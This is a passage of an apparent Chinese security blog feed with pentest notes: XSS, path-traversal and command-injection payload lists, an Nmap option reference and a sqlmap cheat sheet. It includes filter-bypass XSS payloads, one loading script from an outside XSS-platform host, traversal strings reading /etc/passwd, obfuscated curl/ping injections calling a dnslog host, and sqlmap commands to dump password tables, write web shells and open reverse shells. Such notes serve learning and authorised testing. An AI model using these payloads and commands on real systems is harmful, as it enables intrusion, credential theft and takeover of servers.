class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;</span><br><span class="line">&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;</span><br><span class="line">[Bypass on Event] [事件型绕过]</span><br><span class="line"></span><br><span class="line">&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt;  #一般富文本不会过滤img标签</span><br><span class="line">[Bypass pseudo protocol] [伪协议绕过]</span><br><span class="line"></span><br><span class="line">&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;</span><br><span class="line">[Bypass html5 tag] [html5标签绕过]</span><br><span class="line"></span><br><span class="line">&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;</span><br><span class="line">[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]</span><br><span class="line"></span><br><span class="line">&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;</span><br><span class="line">&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;</span><br><span class="line">&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;</span><br><span class="line">如果进行盲测可以根据xss平台地址替换相应的js触发代码</span><br><span class="line">&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[静态文件读取]</p><ul><li><p>[常规检测]</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd</span><br><span class="line">/../../../../../../../../../../../etc/hosts</span><br><span class="line">/../../../../../../../C:/Windows/system.ini [windows]</span><br></pre></td></tr></table></figure></li><li><p>[伪造绕过]</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/././././././././././././././././././././././././../../../../../../etc/passwd</span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd</span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts</span><br></pre></td></tr></table></figure></li><li><p>[后缀绕过]</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd#</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.jpg</span><br><span class="line">/../../../../../../../../../../../etc/passwd#.html</span><br><span class="line">/../../../../../../../../../../../etc/passwd%00.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html</span><br></pre></td></tr></table></figure></li></ul><p>[命令执行漏洞]</p><ul><li><p>[常规检测]</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link</span><br><span class="line"> | curl [random].test.dnslog.link</span><br><span class="line"> | ping -n 2 [random].test.dnslog.link [Windows]</span><br><span class="line"> | ping -c 2 [random].test.dnslog.link  [Linux]</span><br></pre></td></tr></table></figure></li><li><p>[绕过检测]</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link#</span><br><span class="line"> | curl [random].test.dnslog.link#</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link#</span><br><span class="line">%20|%20ping%20-n%202%20[random].test.dnslog.link</span><br><span class="line">%20|%20ping%20-c%202%20[random].test.dnslog.link#</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b [random].test.dnslog.link#</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link#</span><br></pre></td></tr></table></figure></li></ul><p>[ssrf漏洞]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[random].test.dnslog.link/</span><br></pre></td></tr></table></figure><p>[strust2命令执行]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试基本流程&quot;&gt;&lt;a href=&quot;#渗透测试基本流程&quot; class=&quot;headerlink&quot; title=&quot;渗透测试基本流程&quot;&gt;&lt;/a&gt;渗透测试基本流程&lt;/h2&gt;&lt;p&gt;1.信息收集&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器的相关信息（真实ip，系统类型，版本，开放端口
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Interview" scheme="https://winthorlimo.github.io/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Nmap常用参数</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined30/868037e0.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined30/868037e0.html</id>
    <published>2020-06-30T10:10:05.000Z</published>
    <updated>2020-08-20T09:26:34.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul><li>语法结构：nmap [Scan Type(s)] [Options] {target specification}</li><li>端口状态介绍<ul><li>open：确定端口开放，可达</li><li>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li><li>filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li><li>unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</li><li>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</li><li>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</li></ul></li><li>扫描目标格式<ul><li>示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</li><li>-iL:从文件中加载目标</li><li>-iR:随机扫描</li><li>–exclude <host or network>:排除网段或主机地址</host></li><li>–excledefile:排除文件中的地址</li></ul></li><li>主机发现<ul><li>-sL:列出需要扫描的目标，不扫描</li><li>-sn:只做ping扫描，不做端口扫描</li><li>-Pn：跳过主机发现，视所有主机都在线</li><li>-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现</li><li>-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现</li><li>-PO[Protocol list]：基于IP协议字段的ping扫描</li><li>-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析</li><li>–dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器</li><li>–system-dns:调用系统的DNS服务器</li><li>–traceroute：显示追踪到目标的路径</li></ul></li><li>扫描技术<ul><li>-sS/sT/sA/sW/sM:TCP扫描<ul><li>S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放</li><li>T是全连接扫描会和服务器建立完整的三次握手，效率低</li><li>A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件</li><li>W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包</li><li>M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准</li></ul></li><li>-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文</li><li>-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。</li><li>–scanflags <flags>：实现上同上面几种类似，可以让用户自定义TCP标志位。</flags></li><li>-sI <zombie host[:probeport]>: Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1.</zombie></li><li>-sY/sZ:SCTP协议INIT或cookie-echo扫描</li><li>-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测</li><li>-b <ftp relay host>:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的</ftp></li></ul></li><li>端口相关参数<ul><li>-p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</li><li>–exclude-ports <port ranges>: 排除端口</port></li><li>-F：扫描比缺省少的端口（缺省1000，加了-F100）</li><li>-r：顺序扫描端口，缺省是随机分组扫描</li><li>–top-ports <number>:按top排序扫描知名端口</number></li><li>–port-ratio <ratio>: 按比例扫描知名端口，值在0-1之间，越小扫的越多</ratio></li></ul></li><li>系统/版本探测<ul><li>-sV:探测开放的端口的系统/服务信息</li><li>–version-intensity <level>:设置版本检测的详程度级别，0-9，越高越详细</level></li><li>–version-light：输出最可能的版本信息，缺省是2</li><li>–version-all：使用所有的探测条件进行版本/系统探测</li><li>–version-trace:打印详细的版本扫描过程</li></ul></li><li>脚本扫描<ul><li>–script=<lua scripts>:指定脚本名称</lua></li><li>–script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数</li><li>–script-help=<lua scripts>: 查看脚本帮助信息</lua></li><li>–script-updatedb:更新脚本数据库</li></ul></li><li>系统探测<ul><li>-O:激活系统探测</li><li>–osscan-limit:只对开放端口的有效主机进行系统探测</li><li>–osscan-guess：推测系统信息</li></ul></li><li>其他<ul><li>-T<0-5>:时间模板，越大速度越快</0-5></li><li>-6：使能IPV6探测</li><li>-A：使能系统探测、版本检测、脚本扫描、路由追踪</li><li>-V：打印版本号</li><li>-v：增加输出的详细程度</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;语法结构：nmap [Scan Type(s)] [Options] {target specification
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Tools" scheme="https://winthorlimo.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap常用参数</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined30/519cc.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined30/519cc.html</id>
    <published>2020-06-30T10:09:05.000Z</published>
    <updated>2020-08-20T09:26:26.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><ul><li>-u #注入点</li><li>-f #指纹判别数据库类型</li><li>-b #获取数据库版本信息</li><li>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</li><li>-D “” #指定数据库名</li><li>-T “” #指定表名</li><li>-C “” #指定字段</li><li>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</li><li>–columns #列出字段-</li><li>–current-user #获取当前用户名称</li><li>–current-db #获取当前数据库名称</li><li>–users #列数据库所有用户</li><li>–passwords #数据库用户所有密码</li><li>–privileges #查看用户权限(–privileges -U root)</li><li>-U #指定数据库用户</li><li>–dbs #列出所有数据库</li><li>–tables -D “” #列出指定数据库中的表</li><li>–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段</li><li>–dump-all #列出所有数据库所有表</li><li>–exclude-sysdbs #只列出用户自己新建的数据库和表</li><li>–dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</li><li>–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据<br>–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</li><li>–os #指定系统(Linux,Windows)</li><li>-v #详细的等级(0-6)<ul><li>0：只显示Python的回溯，错误和关键消息。</li><li>1：显示信息和警告消息。</li><li>2：显示调试消息。</li><li>3：有效载荷注入。</li><li>4：显示HTTP请求。</li><li>5：显示HTTP响应头。</li><li>6：显示HTTP响应页面的内容</li></ul></li><li>–privileges #查看权限</li><li>–is-dba #是否是数据库管理员</li><li>–roles #枚举数据库用户角色</li><li>–udf-inject #导入用户自定义函数（获取系统权限）</li><li>–union-check #是否支持union 注入</li><li>–union-cols #union 查询表记录</li><li>–union-test #union 语句测试</li><li>–union-use #采用union 注入</li><li>–union-tech orderby #union配合order by</li><li>–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″)</li><li>–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)</li><li>–referer “” #使用referer欺骗(–referer “<a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a>”)</li><li>–user-agent “” #自定义user-agent</li><li>–proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="noopener">http://127.0.0.1:8118</a>″ #代理注入</li><li>–string “” #指定关键词</li><li>–threads 　　 #采用多线程(–threads 3)</li><li>–sql-shell #执行指定sql命令</li><li>–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )</li><li>–file-read #读取指定文件</li><li>–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)</li><li>–file-dest #要写入的文件绝对路径</li><li>–os-cmd=id #执行系统命令</li><li>–os-shell #系统交互shell</li><li>–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)</li><li>–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)</li><li>–os-smbrelay #</li><li>–os-bof #</li><li>–reg-read #读取win系统注册表</li><li>–priv-esc #</li><li>–time-sec= #延迟设置 默认–time-sec=5 为5秒</li><li>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net" target="_blank" rel="noopener">http://sqlmap.sourceforge.net</a>)” #指定user-agent注入</li><li>–eta #盲注</li></ul><h3 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1. 基础用法"></a>1. 基础用法</h3><ul><li>./sqlmap.py -u “注入地址” -v 1 –dbs   // 列举数据库</li><li>./sqlmap.py -u “注入地址” -v 1 –current-db   // 当前数据库</li><li>./sqlmap.py -u “注入地址” -v 1 –users    // 列数据库用户</li><li>./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</li><li>./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”   // 列举数据库的表名</li><li>./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”   // 获取表的列名</li><li>./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据，包含列<br>已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中</li></ul><h3 id="2-sqlmap-post注入"><a href="#2-sqlmap-post注入" class="headerlink" title="2. sqlmap post注入"></a>2. sqlmap post注入</h3><ul><li>在使用Sqlmap进行post型注入时，<br>经常会出现请求遗漏导致注入失败的情况。<br>一个小技巧，即结合burpsuite来使用sqlmap，<br>用这种方法进行post注入测试会更准确，操作起来也非常容易。<ol><li>浏览器打开目标地址http:// <a href="http://www.2cto.com" target="_blank" rel="noopener">www.2cto.com</a> /Login.asp</li><li>配置burp代理(127.0.0.1:8080)以拦截请求</li><li>点击login表单的submit按钮</li><li>如下图，这时候Burp会拦截到了我们的登录POST请求</li><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass<br>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，<br>而-p 大家应该比较熟悉，指定注入用的参数。</li></ol></li></ul><h3 id="3-sqlmap-cookies注入"><a href="#3-sqlmap-cookies注入" class="headerlink" title="3. sqlmap  cookies注入"></a>3. sqlmap  cookies注入</h3><ul><li>sqlmap.py -u “<a href="http://127.0.0.1/base.php&quot;" target="_blank" rel="noopener">http://127.0.0.1/base.php&quot;</a> –cookies “id=1”  –dbs –level 2</li><li>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础  上面加上 –level 2 即可<br>利用sqlmap cookies注入突破用户登录继续注入<br>先把用户登陆的cookie拿到吧，<br>在收藏夹添加一个链接cookies属性：<br>名字自己取<br>javascript:alert(document.cookie)，，需要获取当前cookie的时候，<br>直接点一下这个链接，然后复制一下弹出对话框<br>里的cookie值就搞定了<br>sqlmap.py -u <a href="http://x.x.x.x/Down.aspx?tid=2" target="_blank" rel="noopener">http://x.x.x.x/Down.aspx?tid=2</a> -p tid –dbms mssql –cookie=”info=username=test”<br>-p是指指定参数注入</li></ul><h3 id="4-sqlmap遇到url重写的注入"><a href="#4-sqlmap遇到url重写的注入" class="headerlink" title="4. sqlmap遇到url重写的注入"></a>4. sqlmap遇到url重写的注入</h3><ul><li>哪里存在注入就加上 <em>号<br>./sqlmap.py -u “<a href="http://www.cunlide.com/id1/1" target="_blank" rel="noopener">http://www.cunlide.com/id1/1</a></em>/id2/2”</li></ul><h3 id="5-sqlmap-编码绕waf注入"><a href="#5-sqlmap-编码绕waf注入" class="headerlink" title="5. sqlmap 编码绕waf注入"></a>5. sqlmap 编码绕waf注入</h3><p>在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</p><ul><li>./sqlmap.py -u <a href="http://127.0.0.1/test.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=1</a> -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”</li></ul><p>sqlmap读文件</p><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–file-read “/etc/passwd”</li></ul><p>sqlmap写文件</p><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2</li></ul><p>sqlmap分段脱裤</p><ul><li>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000<br>其他基础：</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称</li><li>sqlmap -u “<a href="http://www.xxoo.com/news?id=1&quot;" target="_blank" rel="noopener">http://www.xxoo.com/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql” –current-db  #获取当前数据库名称</li><li>sqlmap -u “<a href="http://www.xxoo.com/news?id=1&quot;" target="_blank" rel="noopener">http://www.xxoo.com/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql”–tables  -D “db_name” #列表名</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart  –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql”  –dump  -C “column_name”  -T “table_name” -D “db_name” -v 0   #获取字段内容</li></ul><h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><ul><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –users  #列数据库用户</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs#列数据库</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords #数据库用户密码</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges #查看权限</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges -U root #查看指定用户权限</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –roles #枚举数据库用户角色</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！）</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” - –union-check #是否支持union 注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–union-cols #union 查询表记录</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –union-test #union 语句测试</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –union-use –banner #采用union 注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”-b #获取banner信息</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart-v 1 -f #指纹判别数据库类型</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart–proxy”<a href="http://127.0.0.1:8118&quot;" target="_blank" rel="noopener">http://127.0.0.1:8118&quot;</a> #代理注入</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</a>  #指定关键词</li><li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–sql-shell #执行指定sql命令</p></li><li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令</p></li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-shell #系统交互shell</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-pwn #反弹shell</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–reg-read #读取win系统注册表</li><li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs-o 